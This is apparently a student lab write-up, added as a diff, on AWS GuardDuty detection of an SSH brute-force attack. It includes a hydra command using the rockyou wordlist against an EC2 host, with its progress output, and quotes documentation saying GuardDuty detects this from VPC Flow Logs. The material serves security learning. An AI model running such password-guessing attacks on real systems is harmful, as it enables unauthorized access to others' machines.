@@ -1,0 +1,34 @@
+# Describe GuardDuty findings that were detected related to the brute force attack
+
+**After waiting 30 minutes my guardduty hasn't displayed anything, not even the brute force attempts. Below are my cli logs
+ubuntu@ip-10-192-11-137:~$ date
+ra -l ubuntu -P rockyou.txt ssh://ec2-3-226-42Tue Dec 28 05:02:57 UTC 2021
+-0.compute-1.amaubuntu@ip-10-192-11-137:~$ hydra -l ubuntu -P rockyou.txt ssh://ec2-3-226-42-0.compute-1.amazonaws.com
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-28 05:02:59
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
+[DATA] attacking ssh://ec2-3-226-42-0.compute-1.amazonaws.com:22/
+[STATUS] 262.00 tries/min, 262 tries in 00:01h, 14344144 to do in 912:29h, 16 active
+[STATUS] 247.33 tries/min, 742 tries in 00:03h, 14343664 to do in 966:34h, 16 active
+[STATUS] 243.14 tries/min, 1702 tries in 00:07h, 14342704 to do in 983:09h, 16 active
+[STATUS] 241.67 tries/min, 3625 tries in 00:15h, 14340784 to do in 989:02h, 16 active
+[STATUS] 240.81 tries/min, 7465 tries in 00:31h, 14336944 to do in 992:18h, 16 active
+
+# Research the AWS Guard Duty documentation page and explain how GuardDuty may have detected this attack - i.e. what was its source of information.
+
+** Based on the GuardDuty documentation below, detects these attack from VPC Flow Logs.
+
+
+**An EC2 instance has been involved in SSH brute force attacks.
+
+Default severity: Low*
+Note
+
+This finding's severity is low if a brute force attack is aimed at one of your EC2 instances. This finding's severity is high if your EC2 instance is being used to perform the brute force attack.
+
+    Data source: VPC Flow Logs
+
+This finding informs you that an EC2 instance in your AWS environment was involved in a brute force attack aimed at obtaining passwords to SSH services on Linux-based systems. This can indicate unauthorized access to your AWS resources. 
+
